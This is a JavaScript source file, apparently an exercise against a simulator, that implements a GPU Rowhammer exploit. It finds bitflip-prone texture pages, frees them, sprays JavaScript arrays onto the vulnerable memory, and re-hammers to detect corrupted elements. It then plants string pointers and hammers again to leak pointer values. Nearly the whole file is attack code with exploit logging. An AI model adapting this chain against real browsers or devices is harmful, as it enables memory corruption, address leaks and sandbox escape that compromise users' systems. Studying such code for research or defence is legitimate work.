async function hammerTex(textureId) {
  const url = 'hammer_tex?tex_id=' + textureId;
  return await fetch(url).then(data => data.json())
}

async function hammerArray(textureId) {
  const url = 'hammer_array?tex_id=' + textureId;
  return await fetch(url).then(data => data.text())
}

async function exploitGlitch() {
  const allocator = new Allocator(20);
  await allocator._init(0);

  const contPages = allocator.newKGSL.slice(0, allocator.pages)
  console.log(`++ ${contPages.length} continuous pages found`);

  const poolAllocator = new Allocator(2048);
  await poolAllocator._init(0);
  
  // assumption: all 20 allocated pages are target ones. No hammer rows needed for now. Fill target with 0xFF
  // for a 1-to-0 bitflip
  for(let page of contPages) {
    fillTexture(page.texture, 0xFF)
  }
  await sleep(1 * 1000)

  // find pages that are vulnerable and exploitable.
  let hammeredPages = []
  for (let page of contPages) {
    let data = await hammerTex(page.tex_id)
    if (data.bit_flip > -1) {
      console.log(`[Exploit] hammering page ${JSON.stringify(page)} => Success`);
      hammeredPages.push(page)
    }
  }
  
  let exploitablePages = []
  for(let page of hammeredPages) {
    console.log(`[Exploit] checking page ${JSON.stringify(page)}`);
      if (checkForFlip(page.texture)) {
        exploitablePages.push(page)
      }
  }

  // Until this point, all should be done in the prev program. This is now new code the be appended.

  // --- step1: free the 2048 allocation pool (?)
  console.log('[Exploit] ++ releasing 2k textures')
  poolAllocator.clean();
  sleep(1 * 1000)

  // --- step2: free only the vulnerablae pages. In the real code, be careful NOT to free hammer pages.
  console.log('[Exploit] ++ releasing flipable textures')
  allocator.clean();
  sleep(1 * 1000)
  
  
  // --- step3: create a LOT of JS objects. manual says they must be object pointers (e.g.  String or arrayBuffers) 
  // but looks like the simulatro wants them to be aspecific number? don't know
  // each number = 32 bit => BUT its Javascript => Always Float64 => 8 Bytes => 512 * 8 = 4096. Each array of 512 is 1 page
  let flipPages = []
  let numTargets = 1024 * 8
  console.log(`[Exploit] ++ allocating ${numTargets} javascript arrays [${numTargets * KB4 / MB} MB]`)
  for (let i = 0; i < numTargets; i++) {
    let target = []
    fill_arrays(target, KB/2)
    flipPages.push(target)
  }
  
  // --- step4: Trigger hammer on all exploitable textures again. Hope that one of the pages created above falls inside it with
  // the right padding.
  for (let page of exploitablePages) {
    await hammerArray(page.tex_id)
  }
  
  // --- step5: Check each element for a change.
  let exploitLocations = []
  for (let pageIdx = 0; pageIdx < flipPages.length; pageIdx++) {
    let t = flipPages[pageIdx];
    for (let i = 0; i < t.length; i++) {
      let el = t[i];
      let expected = i == 0 ? FIRST_ELEM : INT_MARKER
      if ( el != expected ) {
        let f = new Float64Array(1)
        f[0] = el
        let ua = new Uint8Array(f.buffer)
        let v = new DataView(f.buffer)
        console.log(`[Exploit] +++ Array value change detected [pageIdx ${pageIdx}][offset ${i}]: targetPool[${pageIdx}][${i}] =>  ${el} => ${xNumber(el, true)}`);
        // console.log(ua)
        // console.log(xNumber(INT_MARKER, true));
        
        exploitLocations.push([pageIdx, i])
        
        // for debug
        window.xxx = {ua, v, f}
        // console.log(`new0\t${float64ToInt64Binary(el)}`)
        // console.log(`new1\t${to64bitFloat(el)}`)
        // console.log(`old\t${to64bitFloat(INT_MARKER)}`)
      }
    }
  }

  console.log(`[Exploit] +++ ${contPages.length} cont pages found. ${hammeredPages.length} are hammered. ${exploitablePages.length} pages are exploitable. ${exploitLocations.length} Javascript object were placed on targets..`)

  // step6) replace the values at exploit locations with a pointer. 
  for (let l of exploitLocations) {
    let pageIdx = l[0]
    let pageOffset = l[1]
    flipPages[pageIdx][pageOffset] = "ThisIsAPointer" + pageOffset + "_" + pageIdx
  }

  // step7) Hammer the entire array again
  for (let page of exploitablePages) {
    await hammerArray(page.tex_id)
  }

  // Step8) Read only the targeted locations again. (Can also read the rest but waste of time)
  console.log('#############################');
  for (let l of exploitLocations) {
    let pageIdx = l[0]
    let pageOffset = l[1]
    let value = flipPages[pageIdx][pageOffset]
    console.log(`╪ ╪ ╪ ╪ Leaked Pointers: [${pageIdx},${pageOffset}][value: ${value}][${xNumber(value, true)}]`);
    
  }
}